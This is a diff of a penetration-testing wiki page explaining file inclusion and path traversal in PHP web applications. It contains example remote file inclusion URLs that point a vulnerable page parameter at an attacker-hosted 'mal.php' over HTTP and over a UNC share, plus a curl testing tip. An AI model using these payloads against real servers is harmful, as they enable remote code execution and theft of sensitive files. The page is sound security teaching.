@@ -1,11 +1,15 @@
-# File Inclusion
+# File Inclusion & Path Traversal
 
 ### Theory
 
-File Inclusion refers to a vulnerability in web applications where an attacker can manipulate input parameters to include local or remote files on the server. By exploiting this vulnerability, the attacker can access sensitive files stored on the server, such as configuration files or even execute arbitrary code.
+File Inclusion refers to a vulnerability in web applications where an attacker can manipulate input parameters to **include** local or remote files on the application's running code. Path traversal (directory traversal) refers to a vulnerability where an attacker manipulate input parameters to obtain the contents of a file **outside** of the web server's web root.&#x20;
 
-**Remote File Inclusion (RFI):** The file is loaded from a remote server (Best: You can write the code and the server will execute it). In php this is **disabled** by default (**allow\_url\_include**).\
-**Local File Inclusion (LFI):** The sever loads a local file.
+While directory traversal only allows us to access sensitive files stored on the server, such as configuration files, SSH keys, using a file inclusion, we may be able to execute local or remote files.
+
+There are two types of file inclusion vulnerability:
+
+* **Remote File Inclusion (RFI):** The file is loaded from a remote server (Best: You can write the code and the server will execute it). In php this is **disabled** by default (**allow\_url\_include**).
+* **Local File Inclusion (LFI):** The sever loads a local file.
 
 ```bash
 #Here is a very simple example of an LFI:
@@ -16,11 +20,11 @@ http://example.com/index.php?page=http://atacker.com/mal.php
 http://example.com/index.php?page=\\attacker.com\shared\mal.php
 ```
 
-{% hint style="info" %}
-In PHP, vulnerable functions are: `require`, `require_once`, `include`, `include_once`
-{% endhint %}
-
 ## Practice
+
+{% hint style="info" %}
+In PHP, functions vulnerable to LFI are: `require`, `require_once`, `include`, `include_once`
+{% endhint %}
 
 {% hint style="danger" %}
 When using curl for LFI/RFI/Path Traversal testing, we should use the `--path-as-is` argument to prevent curl from editing our request
